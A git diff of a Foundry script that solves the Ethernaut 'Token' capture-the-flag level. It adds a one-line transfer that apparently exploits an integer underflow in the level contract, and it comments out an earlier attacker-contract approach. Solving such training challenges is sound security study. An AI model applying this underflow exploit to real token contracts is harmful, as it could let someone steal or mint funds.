@@ -17,18 +17,23 @@ contract TokenSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
+        IToken(challengeInstance).transfer(challengeInstance, 21);
+
+        /*
+        // Use Attacker Contract
         TokenAttacker tokenAttacker = new TokenAttacker(challengeInstance);
 
         // Method 1: Low-level call
         (, bytes memory returnData) = challengeInstance.call(abi.encodeWithSignature("totalSupply()"));
-        uint total = abi.decode(returnData, (uint));
-        console2.log("Method 1 totalSupply:", total);
+        uint totalSupply = abi.decode(returnData, (uint));
+        console2.log("Method 1 totalSupply:", totalSupply);
 
         // Method 2: Using interface
-        uint total_ = IToken(challengeInstance).totalSupply();
-        console2.log("Method 2 totalSupply:", total_);
+        uint totalSupply_ = IToken(challengeInstance).totalSupply();
+        console2.log("Method 2 totalSupply:", totalSupply_);
 
-        tokenAttacker.attack(total);
+        tokenAttacker.attack(totalSupply);
+        */
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
